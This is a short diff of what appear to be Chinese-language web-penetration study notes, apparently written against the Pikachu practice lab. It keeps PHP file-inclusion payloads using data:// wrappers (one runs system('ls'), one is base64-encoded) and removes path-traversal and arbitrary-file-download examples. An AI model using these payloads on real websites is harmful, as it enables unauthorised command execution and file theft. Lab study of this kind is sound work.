@@ -102,15 +102,5 @@ data://text/plain, <? php system("ls"); ?>
 data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=
 
 
-目录遍历：
-和文件包含很类似
-/dir_list.php?title=../
-/dir_list.php?title=../../
-/dir_list.php?title=../../../
-有可能会出现文件夹的图案，让人可以知道网站的目录结构
 
-任意文件下载：
-
-http://pikachu.com//vul/unsafedownload/execdownload.php?filename=../key.txt
-需要知道绝对路径，小众漏洞，旁站下载需要vip的东西（想法）
 
